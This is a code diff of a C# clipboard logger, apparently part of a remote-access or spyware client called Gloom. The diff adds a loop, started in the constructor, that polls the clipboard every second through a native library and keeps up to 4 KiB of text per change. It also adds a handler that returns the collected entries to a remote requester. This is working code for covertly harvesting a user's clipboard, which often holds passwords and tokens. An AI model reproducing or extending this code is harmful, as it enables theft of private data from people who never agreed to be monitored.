@@ -1,86 +1,77 @@
 ﻿using Gloom.Client.Features.Logger.InputLog;
+using System;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Gloom.Client.Features.Logger
 {
-	public class ClipboardLogger : FeatureBase, IDisposable
+	public class ClipboardLogger : FeatureBase
 	{
 		protected readonly CancellationTokenSource cancel;
 
-		private int PrevSequenceNum = 0;
-		private bool disposed;
+		[DllImport("Gloom.GloomLib.dll")]
+		private static extern ulong ClipIndex();
+
+		[DllImport("Gloom.GloomLib.dll")]
+		private static extern int ClipTextSize();
+
+		[DllImport("Gloom.GloomLib.dll")]
+		private static extern void ClipTextCopy(int bufferSize, IntPtr buffer);
+
+		private static string GetClipText()
+		{
+			var bufferSize = ClipTextSize();
+			if (bufferSize < 0)
+				return "Error code " + bufferSize;
+			bufferSize = Math.Min(bufferSize, 4096); // Max 4 KiB
+			var mem = Marshal.AllocHGlobal(bufferSize);
+			ClipTextCopy(bufferSize, mem);
+			var strBytes = new byte[bufferSize];
+			Marshal.Copy(mem, strBytes, 0, bufferSize);
+			var str = new string(Encoding.UTF8.GetString(strBytes));
+			Marshal.FreeHGlobal(mem);
+			return str;
+		}
+
+		private ulong PreviousIndex = 0;
+		private List<OpStructs.ClipboardEntry> ClipEntries = new();
 
 		public ClipboardLogger(IMessageSender sender) : base(sender)
 		{
+			Task.Run(async () => await ClipboardSpyProc(cancel.Token));
 		}
 
 		public override Guid[] AcceptedOps => new Guid[] { OpCodes.ClipboardLogRequest, OpCodes.ClipboardLoggerSettingRequest };
-
-		//public ClipboardLogger()
-		//{
-		//	cancel = new CancellationTokenSource();
-		//	Task.Run(async () => await ClipboardSpyProc(cancel.Token));
-		//}
 
 		private async Task ClipboardSpyProc(CancellationToken ct)
 		{
 			while (!ct.IsCancellationRequested)
 			{
-				int newSeqNum = User32.GetClipboardSequenceNumber();
-				if (PrevSequenceNum != newSeqNum)
+				var index = ClipIndex();
+				if (PreviousIndex != index)
 				{
-					var Data = GetClipboardDataNative();
-					if (Data != null)
-					{
-						if (Data.Length > 100)
-							Data = Data[..100] + " (truncated)";
-						InputLogWriter.Push(new ClipboardChangeEntry(DateTime.Now, Data));
-					}
+					var text = GetClipText();
+#if DEBUG
+					Console.WriteLine("Clipboard update: " + text);
+#endif
+					ClipEntries.Add(new OpStructs.ClipboardEntry { TimeStamp = DateTime.Now, Text = text });
 				}
-				PrevSequenceNum = newSeqNum;
-				await Task.Delay(Config.TheConfig.InputLog.ClipboardSpyDelay, ct);
+				PreviousIndex = index;
+				await Task.Delay(1000, ct);
 			}
 		}
 
-		public override Task HandleAsync(Guid op, byte[] data)
+		public override async Task HandleAsync(Guid op, byte[] data)
 		{
 			if (op == OpCodes.ClipboardLogRequest)
 			{
-
+				await SendAsync(OpCodes.ClipboardLogResponse, new OpStructs.ClipboardLogResponse { Entries = ClipEntries });
+				ClipEntries.Clear();
 			}
 			else if (op == OpCodes.ClipboardLoggerSettingRequest)
 			{
 
 			}
-		}
-	}
-
-	internal class ClipboardChangeEntry : InputLogEntry
-	{
-		private readonly string Clipboard;
-
-		public override string PlainTextMessage
-		{
-			get
-			{
-				var sb = new StringBuilder();
-				sb.AppendLine(Environment.NewLine);
-				sb.AppendLine("##### Clipboard change #####");
-				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
-				sb.Append("Data: \"").Append(Clipboard).AppendLine("\"");
-				sb.AppendLine("##### Clipboard change #####");
-				return sb.ToString();
-			}
-		}
-
-		public override object[] DbMessage
-		{
-			get => new object[] { Clipboard };
-		}
-
-		public ClipboardChangeEntry(DateTime timeStamp, string clipboard) : base(timeStamp)
-		{
-			Clipboard = clipboard;
 		}
 	}
 }
